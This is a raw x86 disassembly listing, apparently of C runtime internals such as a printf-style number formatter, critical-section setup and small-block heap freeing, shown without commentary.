  40600a:	jmp    0x406014
  40600c:	mov    eax,DWORD PTR [ebp-0x420]
  406012:	mov    DWORD PTR [esi],eax
  406014:	mov    DWORD PTR [ebp-0x450],0x1
  40601e:	jmp    0x4064e4
  406023:	or     DWORD PTR [ebp-0x408],0x40
  40602a:	mov    DWORD PTR [ebp-0x41c],0xa
  406034:	test   DWORD PTR [ebp-0x408],0x8000
  40603e:	je     0x4061ef
  406044:	add    ebx,esi
  406046:	mov    eax,DWORD PTR [ebx-0x8]
  406049:	mov    edx,DWORD PTR [ebx-0x4]
  40604c:	jmp    0x406238
  406051:	jne    0x406065
  406053:	cmp    cx,0x67
  406057:	jne    0x4060bc
  406059:	mov    DWORD PTR [ebp-0x40c],0x1
  406063:	jmp    0x4060bc
  406065:	cmp    DWORD PTR [ebp-0x40c],eax
  40606b:	jle    0x406073
  40606d:	mov    DWORD PTR [ebp-0x40c],eax
  406073:	cmp    DWORD PTR [ebp-0x40c],0xa3
  40607d:	jle    0x4060bc
  40607f:	mov    edi,DWORD PTR [ebp-0x40c]
  406085:	add    edi,0x15d
  40608b:	push   edi
  40608c:	call   0x4027d8
  406091:	pop    ecx
  406092:	mov    ecx,DWORD PTR [ebp-0x41c]
  406098:	mov    DWORD PTR [ebp-0x458],eax
  40609e:	test   eax,eax
  4060a0:	je     0x4060b2
  4060a2:	mov    DWORD PTR [ebp-0x410],eax
  4060a8:	mov    DWORD PTR [ebp-0x414],edi
  4060ae:	mov    esi,eax
  4060b0:	jmp    0x4060bc
  4060b2:	mov    DWORD PTR [ebp-0x40c],0xa3
  4060bc:	mov    eax,DWORD PTR [ebx]
  4060be:	add    ebx,0x8
  4060c1:	mov    DWORD PTR [ebp-0x46c],eax
  4060c7:	mov    eax,DWORD PTR [ebx-0x4]
  4060ca:	mov    DWORD PTR [ebp-0x468],eax
  4060d0:	lea    eax,[ebp-0x44c]
  4060d6:	push   eax
  4060d7:	push   DWORD PTR [ebp-0x45c]
  4060dd:	movsx  eax,cl
  4060e0:	push   DWORD PTR [ebp-0x40c]
  4060e6:	mov    DWORD PTR [ebp-0x418],ebx
  4060ec:	push   eax
  4060ed:	push   DWORD PTR [ebp-0x414]
  4060f3:	lea    eax,[ebp-0x46c]
  4060f9:	push   esi
  4060fa:	push   eax
  4060fb:	push   DWORD PTR ds:0x40eb58
  406101:	call   0x40361f
  406106:	pop    ecx
  406107:	call   eax
  406109:	mov    ebx,DWORD PTR [ebp-0x408]
  40610f:	add    esp,0x1c
  406112:	and    ebx,0x80
  406118:	je     0x40613b
  40611a:	cmp    DWORD PTR [ebp-0x40c],0x0
  406121:	jne    0x40613b
  406123:	lea    eax,[ebp-0x44c]
  406129:	push   eax
  40612a:	push   esi
  40612b:	push   DWORD PTR ds:0x40eb64
  406131:	call   0x40361f
  406136:	pop    ecx
  406137:	call   eax
  406139:	pop    ecx
  40613a:	pop    ecx
  40613b:	cmp    WORD PTR [ebp-0x41c],0x67
  406143:	jne    0x406161
  406145:	test   ebx,ebx
  406147:	jne    0x406161
  406149:	lea    eax,[ebp-0x44c]
  40614f:	push   eax
  406150:	push   esi
  406151:	push   DWORD PTR ds:0x40eb60
  406157:	call   0x40361f
  40615c:	pop    ecx
  40615d:	call   eax
  40615f:	pop    ecx
  406160:	pop    ecx
  406161:	cmp    BYTE PTR [esi],0x2d
  406164:	jne    0x406177
  406166:	or     DWORD PTR [ebp-0x408],0x100
  406170:	inc    esi
  406171:	mov    DWORD PTR [ebp-0x410],esi
  406177:	push   esi
  406178:	jmp    0x405f85
  40617d:	mov    DWORD PTR [ebp-0x40c],esi
  406183:	mov    DWORD PTR [ebp-0x454],0x7
  40618d:	jmp    0x4061b3
  40618f:	sub    eax,0x73
  406192:	je     0x405e02
  406198:	sub    eax,edx
  40619a:	je     0x40602a
  4061a0:	sub    eax,0x3
  4061a3:	jne    0x406372
  4061a9:	mov    DWORD PTR [ebp-0x454],0x27
  4061b3:	test   BYTE PTR [ebp-0x408],0x80
  4061ba:	mov    DWORD PTR [ebp-0x41c],0x10
  4061c4:	je     0x406034
  4061ca:	push   0x30
  4061cc:	pop    eax
  4061cd:	mov    WORD PTR [ebp-0x430],ax
  4061d4:	mov    eax,DWORD PTR [ebp-0x454]
  4061da:	add    eax,0x51
  4061dd:	mov    WORD PTR [ebp-0x42e],ax
  4061e4:	mov    DWORD PTR [ebp-0x424],edx
  4061ea:	jmp    0x406034
  4061ef:	test   DWORD PTR [ebp-0x408],0x1000
  4061f9:	jne    0x406044
  4061ff:	add    ebx,0x4
  406202:	test   BYTE PTR [ebp-0x408],0x20
  406209:	je     0x406227
  40620b:	test   BYTE PTR [ebp-0x408],0x40
  406212:	mov    DWORD PTR [ebp-0x418],ebx
  406218:	je     0x406220
  40621a:	movsx  eax,WORD PTR [ebx-0x4]
  40621e:	jmp    0x406224
  406220:	movzx  eax,WORD PTR [ebx-0x4]
  406224:	cdq    
  406225:	jmp    0x40623e
  406227:	test   BYTE PTR [ebp-0x408],0x40
  40622e:	mov    eax,DWORD PTR [ebx-0x4]
  406231:	je     0x406236
  406233:	cdq    
  406234:	jmp    0x406238
  406236:	xor    edx,edx
  406238:	mov    DWORD PTR [ebp-0x418],ebx
  40623e:	test   BYTE PTR [ebp-0x408],0x40
  406245:	je     0x406262
  406247:	test   edx,edx
  406249:	jg     0x406262
  40624b:	jl     0x406251
  40624d:	test   eax,eax
  40624f:	jae    0x406262
  406251:	neg    eax
  406253:	adc    edx,0x0
  406256:	neg    edx
  406258:	or     DWORD PTR [ebp-0x408],0x100
  406262:	test   DWORD PTR [ebp-0x408],0x9000
  40626c:	mov    ebx,edx
  40626e:	mov    edi,eax
  406270:	jne    0x406274
  406272:	xor    ebx,ebx
  406274:	cmp    DWORD PTR [ebp-0x40c],0x0
  40627b:	jge    0x406289
  40627d:	mov    DWORD PTR [ebp-0x40c],0x1
  406287:	jmp    0x4062a3
  406289:	and    DWORD PTR [ebp-0x408],0xfffffff7
  406290:	mov    eax,0x200
  406295:	cmp    DWORD PTR [ebp-0x40c],eax
  40629b:	jle    0x4062a3
  40629d:	mov    DWORD PTR [ebp-0x40c],eax
  4062a3:	mov    eax,edi
  4062a5:	or     eax,ebx
  4062a7:	jne    0x4062af
  4062a9:	and    DWORD PTR [ebp-0x424],eax
  4062af:	lea    esi,[ebp-0x205]
  4062b5:	mov    eax,DWORD PTR [ebp-0x40c]
  4062bb:	dec    DWORD PTR [ebp-0x40c]
  4062c1:	test   eax,eax
  4062c3:	jg     0x4062cb
  4062c5:	mov    eax,edi
  4062c7:	or     eax,ebx
  4062c9:	je     0x4062f8
  4062cb:	mov    eax,DWORD PTR [ebp-0x41c]
  4062d1:	cdq    
  4062d2:	push   edx
  4062d3:	push   eax
  4062d4:	push   ebx
  4062d5:	push   edi
  4062d6:	call   0x405820
  4062db:	add    ecx,0x30
  4062de:	cmp    ecx,0x39
  4062e1:	mov    DWORD PTR [ebp-0x470],ebx
  4062e7:	mov    edi,eax
  4062e9:	mov    ebx,edx
  4062eb:	jle    0x4062f3
  4062ed:	add    ecx,DWORD PTR [ebp-0x454]
  4062f3:	mov    BYTE PTR [esi],cl
  4062f5:	dec    esi
  4062f6:	jmp    0x4062b5
  4062f8:	lea    eax,[ebp-0x205]
  4062fe:	sub    eax,esi
  406300:	inc    esi
  406301:	test   DWORD PTR [ebp-0x408],0x200
  40630b:	mov    DWORD PTR [ebp-0x414],eax
  406311:	mov    DWORD PTR [ebp-0x410],esi
  406317:	je     0x406372
  406319:	test   eax,eax
  40631b:	je     0x406324
  40631d:	mov    ecx,esi
  40631f:	cmp    BYTE PTR [ecx],0x30
  406322:	je     0x406372
  406324:	dec    DWORD PTR [ebp-0x410]
  40632a:	mov    ecx,DWORD PTR [ebp-0x410]
  406330:	mov    BYTE PTR [ecx],0x30
  406333:	inc    eax
  406334:	jmp    0x40636c
  406336:	test   ebx,ebx
  406338:	jne    0x406345
  40633a:	mov    eax,ds:0x40eb3c
  40633f:	mov    DWORD PTR [ebp-0x410],eax
  406345:	mov    eax,DWORD PTR [ebp-0x410]
  40634b:	mov    DWORD PTR [ebp-0x428],0x1
  406355:	jmp    0x406360
  406357:	dec    edi
  406358:	cmp    WORD PTR [eax],0x0
  40635c:	je     0x406364
  40635e:	add    eax,edx
  406360:	test   edi,edi
  406362:	jne    0x406357
  406364:	sub    eax,DWORD PTR [ebp-0x410]
  40636a:	sar    eax,1
  40636c:	mov    DWORD PTR [ebp-0x414],eax
  406372:	cmp    DWORD PTR [ebp-0x450],0x0
  406379:	jne    0x4064e4
  40637f:	mov    eax,DWORD PTR [ebp-0x408]
  406385:	test   al,0x40
  406387:	je     0x4063b4
  406389:	test   eax,0x100
  40638e:	je     0x406394
  406390:	push   0x2d
  406392:	jmp    0x4063a2
  406394:	test   al,0x1
  406396:	je     0x40639c
  406398:	push   0x2b
  40639a:	jmp    0x4063a2
  40639c:	test   al,0x2
  40639e:	je     0x4063b4
  4063a0:	push   0x20
  4063a2:	pop    eax
  4063a3:	mov    WORD PTR [ebp-0x430],ax
  4063aa:	mov    DWORD PTR [ebp-0x424],0x1
  4063b4:	mov    ebx,DWORD PTR [ebp-0x42c]
  4063ba:	mov    esi,DWORD PTR [ebp-0x414]
  4063c0:	sub    ebx,esi
  4063c2:	sub    ebx,DWORD PTR [ebp-0x424]
  4063c8:	test   BYTE PTR [ebp-0x408],0xc
  4063cf:	jne    0x4063e8
  4063d1:	push   DWORD PTR [ebp-0x43c]
  4063d7:	lea    eax,[ebp-0x420]
  4063dd:	push   ebx
  4063de:	push   0x20
  4063e0:	call   0x405969
  4063e5:	add    esp,0xc
  4063e8:	push   DWORD PTR [ebp-0x424]
  4063ee:	mov    edi,DWORD PTR [ebp-0x43c]
  4063f4:	lea    eax,[ebp-0x420]
  4063fa:	lea    ecx,[ebp-0x430]
  406400:	call   0x405990
  406405:	test   BYTE PTR [ebp-0x408],0x8
  40640c:	pop    ecx
  40640d:	je     0x40642a
  40640f:	test   BYTE PTR [ebp-0x408],0x4
  406416:	jne    0x40642a
  406418:	push   edi
  406419:	push   ebx
  40641a:	push   0x30
  40641c:	lea    eax,[ebp-0x420]
  406422:	call   0x405969
  406427:	add    esp,0xc
  40642a:	cmp    DWORD PTR [ebp-0x428],0x0
  406431:	jne    0x4064a8
  406433:	test   esi,esi
  406435:	jle    0x4064a8
  406437:	mov    edi,DWORD PTR [ebp-0x410]
  40643d:	mov    DWORD PTR [ebp-0x41c],esi
  406443:	dec    DWORD PTR [ebp-0x41c]
  406449:	lea    eax,[ebp-0x44c]
  40644f:	push   eax
  406450:	mov    eax,DWORD PTR [ebp-0x44c]
  406456:	push   DWORD PTR [eax+0xac]
  40645c:	lea    eax,[ebp-0x464]
  406462:	push   edi
  406463:	push   eax
  406464:	call   0x40569b
  406469:	add    esp,0x10
  40646c:	mov    DWORD PTR [ebp-0x470],eax
  406472:	test   eax,eax
  406474:	jle    0x40649f
  406476:	push   DWORD PTR [ebp-0x464]
  40647c:	mov    eax,DWORD PTR [ebp-0x43c]
  406482:	lea    esi,[ebp-0x420]
  406488:	call   0x40593a
  40648d:	add    edi,DWORD PTR [ebp-0x470]
  406493:	cmp    DWORD PTR [ebp-0x41c],0x0
  40649a:	pop    ecx
  40649b:	jg     0x406443
  40649d:	jmp    0x4064bb
  40649f:	or     DWORD PTR [ebp-0x420],0xffffffff
  4064a6:	jmp    0x4064bb
  4064a8:	mov    ecx,DWORD PTR [ebp-0x410]
  4064ae:	push   esi
  4064af:	lea    eax,[ebp-0x420]
  4064b5:	call   0x405990
  4064ba:	pop    ecx
  4064bb:	cmp    DWORD PTR [ebp-0x420],0x0
  4064c2:	jl     0x4064e4
  4064c4:	test   BYTE PTR [ebp-0x408],0x4
  4064cb:	je     0x4064e4
  4064cd:	push   DWORD PTR [ebp-0x43c]
  4064d3:	lea    eax,[ebp-0x420]
  4064d9:	push   ebx
  4064da:	push   0x20
  4064dc:	call   0x405969
  4064e1:	add    esp,0xc
  4064e4:	cmp    DWORD PTR [ebp-0x458],0x0
  4064eb:	je     0x406500
  4064ed:	push   DWORD PTR [ebp-0x458]
  4064f3:	call   0x402682
  4064f8:	and    DWORD PTR [ebp-0x458],0x0
  4064ff:	pop    ecx
  406500:	mov    edi,DWORD PTR [ebp-0x460]
  406506:	mov    ebx,DWORD PTR [ebp-0x418]
  40650c:	movzx  eax,WORD PTR [edi]
  40650f:	xor    esi,esi
  406511:	mov    DWORD PTR [ebp-0x41c],eax
  406517:	cmp    ax,si
  40651a:	je     0x406523
  40651c:	mov    ecx,eax
  40651e:	jmp    0x405ac4
  406523:	cmp    DWORD PTR [ebp-0x434],esi
  406529:	je     0x406538
  40652b:	cmp    DWORD PTR [ebp-0x434],0x7
  406532:	jne    0x405a88
  406538:	cmp    BYTE PTR [ebp-0x440],0x0
  40653f:	je     0x40654b
  406541:	mov    eax,DWORD PTR [ebp-0x444]
  406547:	and    DWORD PTR [eax+0x70],0xfffffffd
  40654b:	mov    eax,DWORD PTR [ebp-0x420]
  406551:	mov    ecx,DWORD PTR [ebp-0x4]
  406554:	pop    edi
  406555:	pop    esi
  406556:	xor    ecx,ebp
  406558:	pop    ebx
  406559:	call   0x401d11
  40655e:	leave  
  40655f:	ret    
  406560:	mov    edi,edi
  406562:	xor    bl,BYTE PTR [ebp+0x40]
  406565:	add    BYTE PTR [edx],ch
  406567:	pop    ebx
  406568:	inc    eax
  406569:	add    BYTE PTR [ebx+ebx*2+0x40],bl
  40656d:	add    BYTE PTR [edi+0x300405b],dh
  406573:	pop    esp
  406574:	inc    eax
  406575:	add    BYTE PTR [edi],cl
  406577:	pop    esp
  406578:	inc    eax
  406579:	add    BYTE PTR [ebp+0x5c],dl
  40657c:	inc    eax
  40657d:	add    BYTE PTR [ebp+ebx*2+0x40],dl
  406581:	add    BYTE PTR [ebx+0x335756ff],cl
  406587:	idiv   BYTE PTR [edi+0x40f800]
  40658d:	cmp    DWORD PTR [esi*8+0x40eb74],0x1
  406595:	jne    0x4065b5
  406597:	lea    eax,[esi*8+0x40eb70]
  40659e:	mov    DWORD PTR [eax],edi
  4065a0:	push   0xfa0
  4065a5:	push   DWORD PTR [eax]
  4065a7:	add    edi,0x18
  4065aa:	call   0x407c4c
  4065af:	pop    ecx
  4065b0:	pop    ecx
  4065b1:	test   eax,eax
  4065b3:	je     0x4065c1
  4065b5:	inc    esi
  4065b6:	cmp    esi,0x24
  4065b9:	jl     0x40658d
  4065bb:	xor    eax,eax
  4065bd:	inc    eax
  4065be:	pop    edi
  4065bf:	pop    esi
  4065c0:	ret    
  4065c1:	and    DWORD PTR [esi*8+0x40eb70],0x0
  4065c9:	xor    eax,eax
  4065cb:	jmp    0x4065be
  4065cd:	mov    edi,edi
  4065cf:	push   ebx
  4065d0:	mov    ebx,DWORD PTR ds:0x40b0e4
  4065d6:	push   esi
  4065d7:	mov    esi,0x40eb70
  4065dc:	push   edi
  4065dd:	mov    edi,DWORD PTR [esi]
  4065df:	test   edi,edi
  4065e1:	je     0x4065f6
  4065e3:	cmp    DWORD PTR [esi+0x4],0x1
  4065e7:	je     0x4065f6
  4065e9:	push   edi
  4065ea:	call   ebx
  4065ec:	push   edi
  4065ed:	call   0x402682
  4065f2:	and    DWORD PTR [esi],0x0
  4065f5:	pop    ecx
  4065f6:	add    esi,0x8
  4065f9:	cmp    esi,0x40ec90
  4065ff:	jl     0x4065dd
  406601:	mov    esi,0x40eb70
  406606:	pop    edi
  406607:	mov    eax,DWORD PTR [esi]
  406609:	test   eax,eax
  40660b:	je     0x406616
  40660d:	cmp    DWORD PTR [esi+0x4],0x1
  406611:	jne    0x406616
  406613:	push   eax
  406614:	call   ebx
  406616:	add    esi,0x8
  406619:	cmp    esi,0x40ec90
  40661f:	jl     0x406607
  406621:	pop    esi
  406622:	pop    ebx
  406623:	ret    
  406624:	mov    edi,edi
  406626:	push   ebp
  406627:	mov    ebp,esp
  406629:	mov    eax,DWORD PTR [ebp+0x8]
  40662c:	push   DWORD PTR [eax*8+0x40eb70]
  406633:	call   DWORD PTR ds:0x40b134
  406639:	pop    ebp
  40663a:	ret    
  40663b:	push   0xc
  40663d:	push   0x40c898
  406642:	call   0x403b74
  406647:	xor    edi,edi
  406649:	inc    edi
  40664a:	mov    DWORD PTR [ebp-0x1c],edi
  40664d:	xor    ebx,ebx
  40664f:	cmp    DWORD PTR ds:0x40f7b4,ebx
  406655:	jne    0x40666f
  406657:	call   0x402dea
  40665c:	push   0x1e
  40665e:	call   0x402c3f
  406663:	push   0xff
  406668:	call   0x40298b
  40666d:	pop    ecx
  40666e:	pop    ecx
  40666f:	mov    esi,DWORD PTR [ebp+0x8]
  406672:	lea    esi,[esi*8+0x40eb70]
  406679:	cmp    DWORD PTR [esi],ebx
  40667b:	je     0x406681
  40667d:	mov    eax,edi
  40667f:	jmp    0x4066ef
  406681:	push   0x18
  406683:	call   0x4027d8
  406688:	pop    ecx
  406689:	mov    edi,eax
  40668b:	cmp    edi,ebx
  40668d:	jne    0x40669e
  40668f:	call   0x4024b6
  406694:	mov    DWORD PTR [eax],0xc
  40669a:	xor    eax,eax
  40669c:	jmp    0x4066ef
  40669e:	push   0xa
  4066a0:	call   0x4066fe
  4066a5:	pop    ecx
  4066a6:	mov    DWORD PTR [ebp-0x4],ebx
  4066a9:	cmp    DWORD PTR [esi],ebx
  4066ab:	jne    0x4066d9
  4066ad:	push   0xfa0
  4066b2:	push   edi
  4066b3:	call   0x407c4c
  4066b8:	pop    ecx
  4066b9:	pop    ecx
  4066ba:	test   eax,eax
  4066bc:	jne    0x4066d5
  4066be:	push   edi
  4066bf:	call   0x402682
  4066c4:	pop    ecx
  4066c5:	call   0x4024b6
  4066ca:	mov    DWORD PTR [eax],0xc
  4066d0:	mov    DWORD PTR [ebp-0x1c],ebx
  4066d3:	jmp    0x4066e0
  4066d5:	mov    DWORD PTR [esi],edi
  4066d7:	jmp    0x4066e0
  4066d9:	push   edi
  4066da:	call   0x402682
  4066df:	pop    ecx
  4066e0:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4066e7:	call   0x4066f5
  4066ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4066ef:	call   0x403bb9
  4066f4:	ret    
  4066f5:	push   0xa
  4066f7:	call   0x406624
  4066fc:	pop    ecx
  4066fd:	ret    
  4066fe:	mov    edi,edi
  406700:	push   ebp
  406701:	mov    ebp,esp
  406703:	mov    eax,DWORD PTR [ebp+0x8]
  406706:	push   esi
  406707:	lea    esi,[eax*8+0x40eb70]
  40670e:	cmp    DWORD PTR [esi],0x0
  406711:	jne    0x406726
  406713:	push   eax
  406714:	call   0x40663b
  406719:	pop    ecx
  40671a:	test   eax,eax
  40671c:	jne    0x406726
  40671e:	push   0x11
  406720:	call   0x402937
  406725:	pop    ecx
  406726:	push   DWORD PTR [esi]
  406728:	call   DWORD PTR ds:0x40b130
  40672e:	pop    esi
  40672f:	pop    ebp
  406730:	ret    
  406731:	mov    edi,edi
  406733:	push   ebp
  406734:	mov    ebp,esp
  406736:	mov    ecx,DWORD PTR ds:0x41140c
  40673c:	mov    eax,ds:0x411410
  406741:	imul   ecx,ecx,0x14
  406744:	add    ecx,eax
  406746:	jmp    0x406759
  406748:	mov    edx,DWORD PTR [ebp+0x8]
  40674b:	sub    edx,DWORD PTR [eax+0xc]
  40674e:	cmp    edx,0x100000
  406754:	jb     0x40675f
  406756:	add    eax,0x14
  406759:	cmp    eax,ecx
  40675b:	jb     0x406748
  40675d:	xor    eax,eax
  40675f:	pop    ebp
  406760:	ret    
  406761:	mov    edi,edi
  406763:	push   ebp
  406764:	mov    ebp,esp
  406766:	sub    esp,0x10
  406769:	mov    ecx,DWORD PTR [ebp+0x8]
  40676c:	mov    eax,DWORD PTR [ecx+0x10]
  40676f:	push   esi
  406770:	mov    esi,DWORD PTR [ebp+0xc]
  406773:	push   edi
  406774:	mov    edi,esi
  406776:	sub    edi,DWORD PTR [ecx+0xc]
  406779:	add    esi,0xfffffffc
  40677c:	shr    edi,0xf
  40677f:	mov    ecx,edi
  406781:	imul   ecx,ecx,0x204
  406787:	lea    ecx,[ecx+eax*1+0x144]
  40678e:	mov    DWORD PTR [ebp-0x10],ecx
  406791:	mov    ecx,DWORD PTR [esi]
  406793:	dec    ecx
  406794:	mov    DWORD PTR [ebp-0x4],ecx
  406797:	test   cl,0x1
  40679a:	jne    0x406a73
  4067a0:	push   ebx
  4067a1:	lea    ebx,[ecx+esi*1]
  4067a4:	mov    edx,DWORD PTR [ebx]
  4067a6:	mov    DWORD PTR [ebp-0xc],edx
  4067a9:	mov    edx,DWORD PTR [esi-0x4]
  4067ac:	mov    DWORD PTR [ebp-0x8],edx
  4067af:	mov    edx,DWORD PTR [ebp-0xc]
  4067b2:	mov    DWORD PTR [ebp+0xc],ebx
  4067b5:	test   dl,0x1
  4067b8:	jne    0x40682e
  4067ba:	sar    edx,0x4
  4067bd:	dec    edx
  4067be:	cmp    edx,0x3f
  4067c1:	jbe    0x4067c6
  4067c3:	push   0x3f
  4067c5:	pop    edx
  4067c6:	mov    ecx,DWORD PTR [ebx+0x4]
  4067c9:	cmp    ecx,DWORD PTR [ebx+0x8]
  4067cc:	jne    0x406810
  4067ce:	mov    ebx,0x80000000
  4067d3:	cmp    edx,0x20
  4067d6:	jae    0x4067f1
  4067d8:	mov    ecx,edx
  4067da:	shr    ebx,cl
  4067dc:	lea    ecx,[edx+eax*1+0x4]
  4067e0:	not    ebx
  4067e2:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4067e6:	dec    BYTE PTR [ecx]
  4067e8:	jne    0x40680d
  4067ea:	mov    ecx,DWORD PTR [ebp+0x8]
  4067ed:	and    DWORD PTR [ecx],ebx
  4067ef:	jmp    0x40680d
  4067f1:	lea    ecx,[edx-0x20]
  4067f4:	shr    ebx,cl
  4067f6:	lea    ecx,[edx+eax*1+0x4]
  4067fa:	not    ebx
  4067fc:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  406803:	dec    BYTE PTR [ecx]
  406805:	jne    0x40680d
  406807:	mov    ecx,DWORD PTR [ebp+0x8]
  40680a:	and    DWORD PTR [ecx+0x4],ebx
  40680d:	mov    ebx,DWORD PTR [ebp+0xc]
  406810:	mov    edx,DWORD PTR [ebx+0x8]
  406813:	mov    ebx,DWORD PTR [ebx+0x4]
  406816:	mov    ecx,DWORD PTR [ebp-0x4]
  406819:	add    ecx,DWORD PTR [ebp-0xc]
  40681c:	mov    DWORD PTR [edx+0x4],ebx
  40681f:	mov    edx,DWORD PTR [ebp+0xc]
  406822:	mov    ebx,DWORD PTR [edx+0x4]
  406825:	mov    edx,DWORD PTR [edx+0x8]
  406828:	mov    DWORD PTR [ebx+0x8],edx
  40682b:	mov    DWORD PTR [ebp-0x4],ecx
  40682e:	mov    edx,ecx
  406830:	sar    edx,0x4
  406833:	dec    edx
  406834:	cmp    edx,0x3f
  406837:	jbe    0x40683c
  406839:	push   0x3f
  40683b:	pop    edx
  40683c:	mov    ebx,DWORD PTR [ebp-0x8]
  40683f:	and    ebx,0x1
  406842:	mov    DWORD PTR [ebp-0xc],ebx
  406845:	jne    0x4068da
  40684b:	sub    esi,DWORD PTR [ebp-0x8]
  40684e:	mov    ebx,DWORD PTR [ebp-0x8]
  406851:	sar    ebx,0x4
  406854:	push   0x3f
  406856:	mov    DWORD PTR [ebp+0xc],esi
  406859:	dec    ebx
  40685a:	pop    esi
  40685b:	cmp    ebx,esi
  40685d:	jbe    0x406861
  40685f:	mov    ebx,esi
  406861:	add    ecx,DWORD PTR [ebp-0x8]
  406864:	mov    edx,ecx
  406866:	sar    edx,0x4
  406869:	dec    edx
  40686a:	mov    DWORD PTR [ebp-0x4],ecx
  40686d:	cmp    edx,esi
  40686f:	jbe    0x406873
  406871:	mov    edx,esi
  406873:	cmp    ebx,edx
  406875:	je     0x4068d5
  406877:	mov    ecx,DWORD PTR [ebp+0xc]
  40687a:	mov    esi,DWORD PTR [ecx+0x4]
  40687d:	cmp    esi,DWORD PTR [ecx+0x8]
  406880:	jne    0x4068bd
  406882:	mov    esi,0x80000000
  406887:	cmp    ebx,0x20
  40688a:	jae    0x4068a3
  40688c:	mov    ecx,ebx
  40688e:	shr    esi,cl
  406890:	not    esi
  406892:	and    DWORD PTR [eax+edi*4+0x44],esi
  406896:	dec    BYTE PTR [ebx+eax*1+0x4]
  40689a:	jne    0x4068bd
  40689c:	mov    ecx,DWORD PTR [ebp+0x8]
  40689f:	and    DWORD PTR [ecx],esi
  4068a1:	jmp    0x4068bd
  4068a3:	lea    ecx,[ebx-0x20]
  4068a6:	shr    esi,cl
  4068a8:	not    esi
  4068aa:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4068b1:	dec    BYTE PTR [ebx+eax*1+0x4]
  4068b5:	jne    0x4068bd
  4068b7:	mov    ecx,DWORD PTR [ebp+0x8]
  4068ba:	and    DWORD PTR [ecx+0x4],esi
  4068bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4068c0:	mov    esi,DWORD PTR [ecx+0x8]
  4068c3:	mov    ecx,DWORD PTR [ecx+0x4]
  4068c6:	mov    DWORD PTR [esi+0x4],ecx
  4068c9:	mov    ecx,DWORD PTR [ebp+0xc]
  4068cc:	mov    esi,DWORD PTR [ecx+0x4]
  4068cf:	mov    ecx,DWORD PTR [ecx+0x8]
  4068d2:	mov    DWORD PTR [esi+0x8],ecx
  4068d5:	mov    esi,DWORD PTR [ebp+0xc]
  4068d8:	jmp    0x4068dd
  4068da:	mov    ebx,DWORD PTR [ebp+0x8]
  4068dd:	cmp    DWORD PTR [ebp-0xc],0x0
  4068e1:	jne    0x4068eb
  4068e3:	cmp    ebx,edx
  4068e5:	je     0x40696b
  4068eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4068ee:	lea    ecx,[ecx+edx*8]
  4068f1:	mov    ebx,DWORD PTR [ecx+0x4]
  4068f4:	mov    DWORD PTR [esi+0x8],ecx
  4068f7:	mov    DWORD PTR [esi+0x4],ebx
  4068fa:	mov    DWORD PTR [ecx+0x4],esi
  4068fd:	mov    ecx,DWORD PTR [esi+0x4]
  406900:	mov    DWORD PTR [ecx+0x8],esi
  406903:	mov    ecx,DWORD PTR [esi+0x4]
  406906:	cmp    ecx,DWORD PTR [esi+0x8]
  406909:	jne    0x40696b
  40690b:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  40690f:	mov    BYTE PTR [ebp+0xf],cl
  406912:	inc    cl
  406914:	mov    BYTE PTR [edx+eax*1+0x4],cl
  406918:	cmp    edx,0x20
  40691b:	jae    0x406942
  40691d:	cmp    BYTE PTR [ebp+0xf],0x0
  406921:	jne    0x406931
  406923:	mov    ecx,edx
  406925:	mov    ebx,0x80000000
  40692a:	shr    ebx,cl
  40692c:	mov    ecx,DWORD PTR [ebp+0x8]
  40692f:	or     DWORD PTR [ecx],ebx
  406931:	mov    ebx,0x80000000
  406936:	mov    ecx,edx
  406938:	shr    ebx,cl
  40693a:	lea    eax,[eax+edi*4+0x44]
  40693e:	or     DWORD PTR [eax],ebx
  406940:	jmp    0x40696b
  406942:	cmp    BYTE PTR [ebp+0xf],0x0
  406946:	jne    0x406958
  406948:	lea    ecx,[edx-0x20]
  40694b:	mov    ebx,0x80000000
  406950:	shr    ebx,cl
  406952:	mov    ecx,DWORD PTR [ebp+0x8]
  406955:	or     DWORD PTR [ecx+0x4],ebx
  406958:	lea    ecx,[edx-0x20]
  40695b:	mov    edx,0x80000000
  406960:	shr    edx,cl
  406962:	lea    eax,[eax+edi*4+0xc4]
  406969:	or     DWORD PTR [eax],edx
  40696b:	mov    eax,DWORD PTR [ebp-0x4]
  40696e:	mov    DWORD PTR [esi],eax
  406970:	mov    DWORD PTR [eax+esi*1-0x4],eax
  406974:	mov    eax,DWORD PTR [ebp-0x10]
  406977:	dec    DWORD PTR [eax]
  406979:	jne    0x406a72
  40697f:	mov    eax,ds:0x40f950
  406984:	test   eax,eax
  406986:	je     0x406a64
  40698c:	mov    ecx,DWORD PTR ds:0x411420
  406992:	mov    esi,DWORD PTR ds:0x40b10c
  406998:	push   0x4000
  40699d:	shl    ecx,0xf
  4069a0:	add    ecx,DWORD PTR [eax+0xc]
  4069a3:	mov    ebx,0x8000
  4069a8:	push   ebx
  4069a9:	push   ecx
  4069aa:	call   esi
  4069ac:	mov    ecx,DWORD PTR ds:0x411420
  4069b2:	mov    eax,ds:0x40f950
  4069b7:	mov    edx,0x80000000
  4069bc:	shr    edx,cl
  4069be:	or     DWORD PTR [eax+0x8],edx
  4069c1:	mov    eax,ds:0x40f950
  4069c6:	mov    eax,DWORD PTR [eax+0x10]
  4069c9:	mov    ecx,DWORD PTR ds:0x411420
  4069cf:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4069d7:	mov    eax,ds:0x40f950
  4069dc:	mov    eax,DWORD PTR [eax+0x10]
  4069df:	dec    BYTE PTR [eax+0x43]
  4069e2:	mov    eax,ds:0x40f950
  4069e7:	mov    ecx,DWORD PTR [eax+0x10]
  4069ea:	cmp    BYTE PTR [ecx+0x43],0x0
  4069ee:	jne    0x4069f9
  4069f0:	and    DWORD PTR [eax+0x4],0xfffffffe
  4069f4:	mov    eax,ds:0x40f950
  4069f9:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4069fd:	jne    0x406a64
  4069ff:	push   ebx
  406a00:	push   0x0
  406a02:	push   DWORD PTR [eax+0xc]
  406a05:	call   esi
  406a07:	mov    eax,ds:0x40f950
  406a0c:	push   DWORD PTR [eax+0x10]
  406a0f:	push   0x0
  406a11:	push   DWORD PTR ds:0x40f7b4
  406a17:	call   DWORD PTR ds:0x40b0b4
  406a1d:	mov    ecx,DWORD PTR ds:0x41140c
